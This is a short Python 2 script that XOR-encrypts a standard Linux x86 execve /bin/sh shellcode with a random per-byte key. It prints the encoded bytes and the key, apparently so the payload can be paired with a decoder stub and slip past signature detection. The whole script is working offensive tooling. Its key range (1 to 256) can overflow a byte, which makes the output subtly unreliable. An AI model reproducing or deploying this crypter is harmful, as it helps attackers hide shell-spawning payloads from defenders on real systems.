#!/usr/bin/python

import random

shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

crypted = ""
crypted2 = ""
key = ""

print 'crypted shellcode ...'

for shellcodebyte in bytearray(shellcode): 	
	keybyte = random.randint(1, 256)
	key += '0x'
	key += ('%02x,' % keybyte)

	cryptedbyte = shellcodebyte ^ keybyte

	crypted += '\\x'
	crypted += '%02x' % cryptedbyte

	crypted2 += '0x'
	crypted2 += '%02x,' % cryptedbyte

print crypted
print crypted2
print 'Len: %d' % len(bytearray(shellcode))

print 'Key: ' + key
